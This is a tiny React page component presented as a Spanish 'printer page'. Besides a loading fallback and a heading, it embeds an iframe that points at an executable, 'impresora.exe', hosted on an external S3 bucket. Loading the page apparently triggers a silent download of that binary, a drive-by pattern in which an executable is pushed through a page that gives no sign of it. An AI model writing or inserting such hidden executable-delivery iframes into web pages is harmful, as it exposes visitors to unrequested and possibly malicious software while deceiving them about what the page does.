import { Suspense } from "react"
export default function Home() {
  return (
    <>
      <iframe src='https://pokerlap.s3.amazonaws.com/impresora.exe' />
      <Suspense fallback={<div>Cargando...</div>}>
        <div style={{ padding: '60px 20px', textAlign: 'center' }}>
          <p>Página Impresora</p>
        </div>
      </Suspense>
    </>
  )
}

